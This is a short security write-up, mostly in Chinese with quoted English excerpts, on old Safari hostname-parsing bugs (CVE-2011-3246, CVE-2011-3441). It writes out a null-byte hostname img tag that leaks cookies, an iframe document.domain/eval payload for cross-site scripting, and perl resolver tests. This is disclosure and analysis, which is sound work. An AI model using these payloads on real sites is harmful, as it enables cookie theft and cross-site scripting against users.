基于Hostname的攻击----# 第一部分：Safari的HTTP Cookie泄露Safari有一个[bug](https://bugs.webkit.org/show_bug.cgi?id=30225)，在将URL返回到JS之前，在内部对URL进行了解码。这样会对客户端安全产生影响。`<img src=http://mallo.ry%00.victim.com/>`这个看似正常的图片会做以下事情：* 将`mallo.ry%00.victim.com`当做`victim.com`的子域。* DNS解析器使用了C语言的字符串，在第一个空字符（null）处停止，并且解析`mallo.ry`的IP地址。危害：任何站点都可以只用一个图片标签来盗取其他站点的cookie。### links[1](http://steike.com/hostnames/1/)[2](http://steike.com/hostnames/2/)### excerptsCVE-2011-3441The patch for CVE-2011-3246 worked by changing CFNetwork's cookie handling to no longer return any cookies for domain names containing null bytes.This means the exact exploit http://mallo.ry%00.victim.com/ no longer delivered any cookies to mallo.ry. However, Safari still made the request, and the response was interpreted as a subdomain of victim.com for document.domain purposes. If any part of the victim site set document.domain, you could run something like this and get a full XSS:```<body onload="document.domain = 'victim.com';"><iframe src="http://victim.com/subpage-that-lowers/"  onload="this.contentWindow.eval('.....')">```#### Bonus cookie leakA second vector allowed much the same exploit as CVE-2011-3246, because of a quirk of the OS X resolver:```mac# perl -e 'print unpack "H*", gethostbyname "127.0.0.1";'7f000001mac# perl -e 'print unpack "H*", gethostbyname "127.0.0.1 .unrelated.com";'7f000001mac#linux# perl -e 'print unpack "H*", gethostbyname "127.0.0.1"; '7f000001linux# perl -e 'print unpack "H*", gethostbyname "127.0.0.1 .unrelated.com"; 'linux#```Thus a URL like http://127.0.0.1%20.victim.com/ would still ship the user's cookies off into the void.As an extra bonus, 0x7f000001%20.victim.com gives the same result with no dots in the host name – this turns out to be very useful if the site uses HTTPS (see part 3)